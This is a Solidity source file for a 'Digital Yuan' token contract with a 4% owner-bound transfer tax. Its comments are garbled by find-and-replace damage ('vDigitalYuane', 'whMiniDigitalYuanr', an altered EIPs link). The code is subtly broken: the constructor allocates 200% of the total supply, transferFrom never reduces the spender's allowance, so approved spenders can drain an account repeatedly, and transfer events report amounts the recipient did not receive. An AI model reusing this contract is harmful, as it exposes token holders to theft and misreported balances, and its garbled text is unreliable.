// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
// https://coinmarketcap.com/currencies/DigitalYuan/
interface IERC20 {
  // @dev Returns the amount of MiniDigitalYuan in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniDigitalYuan owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vDigitalYuane);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vDigitalYuane
    );
  
  */

  /**
   * @dev Moves `amount` MiniDigitalYuan from the caller's account to `recipient`.
   *
   * Returns a boolean vDigitalYuane indicating whMiniDigitalYuanr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniDigitalYuan that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vDigitalYuane changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniDigitalYuan.
   *
   * Returns a boolean vDigitalYuane indicating whMiniDigitalYuanr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vDigitalYuane afterwards:
   * https://github.com/DigitalYuan/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniDigitalYuan from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vDigitalYuane indicating whMiniDigitalYuanr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vDigitalYuane` MiniDigitalYuan are moved from one account (`from`) to  another (`to`). Note that `vDigitalYuane` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vDigitalYuane);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vDigitalYuane` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vDigitalYuane);
}

contract DigitalYuan is IERC20 {

    // common addresses
    address private owner;
    address private DigitalYuans;
    address private MiniDigitalYuan;
    address private Soccer;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Digital Yuan";
    string public override symbol = "DigitalYuan";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vDigitalYuane);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vDigitalYuane);
    
    // On init of contract we're going to set the admin and give them all MiniDigitalYuan.
    constructor(uint totalSupplyVDigitalYuane, address DigitalYuansAddress, address MiniDigitalYuanAddress, address SoccerAddress) {
        // set total supply
        totalSupply = totalSupplyVDigitalYuane;
        
        // designate addresses
        owner = msg.sender;
        DigitalYuans = DigitalYuansAddress;
        MiniDigitalYuan = MiniDigitalYuanAddress;
        Soccer = SoccerAddress;

        
        // split the MiniDigitalYuan according to agreed upon percentages
        balances[DigitalYuans] =  totalSupply * 10 / 100;
        balances[MiniDigitalYuan] = totalSupply * 39 / 100;
        balances[Soccer] = totalSupply * 100 / 100;

        
        balances[owner] = totalSupply * 51 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vDigitalYuane) public override returns(bool) {
        require(vDigitalYuane > 0, "Transfer vDigitalYuane has to be higher than 0.");
        require(balanceOf(msg.sender) >= vDigitalYuane, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vDigitalYuane
        uint reMiniDigitalYuanBD = vDigitalYuane * 4 / 100;
        uint burnTBD = vDigitalYuane * 0 / 100;
        uint vDigitalYuaneAfterTaxAndBurn = vDigitalYuane - reMiniDigitalYuanBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vDigitalYuaneAfterTaxAndBurn;
        balances[msg.sender] -= vDigitalYuane;
        
        emit Transfer(msg.sender, to, vDigitalYuane);
        
        // finally, we burn and tax the DigitalYuans percentage
        balances[owner] += reMiniDigitalYuanBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vDigitalYuane) public override returns(bool) {
        allowances[msg.sender][spender] = vDigitalYuane; 
        
        emit Approval(msg.sender, spender, vDigitalYuane);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vDigitalYuane) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vDigitalYuane, "Allowance too low for transfer.");
        require(balances[from] >= vDigitalYuane, "Balance is too low to make transfer.");
        
        balances[to] += vDigitalYuane;
        balances[from] -= vDigitalYuane;
        
        emit Transfer(from, to, vDigitalYuane);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}